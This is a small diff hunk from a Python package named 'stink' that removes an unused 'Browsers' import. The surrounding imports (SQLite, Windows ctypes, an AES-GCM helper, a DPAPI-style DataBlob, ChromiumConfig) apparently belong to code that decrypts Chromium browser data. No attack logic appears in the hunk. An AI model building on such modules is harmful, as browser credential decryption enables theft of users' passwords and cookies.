@@ -8,7 +8,7 @@ from sqlite3 import connect, Connection, Cursor
 from ctypes import windll, byref, cdll, c_buffer
 
 from stink.enums.features import Features
-from stink.helpers.config import ChromiumConfig, Browsers
+from stink.helpers.config import ChromiumConfig
 from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
 
 
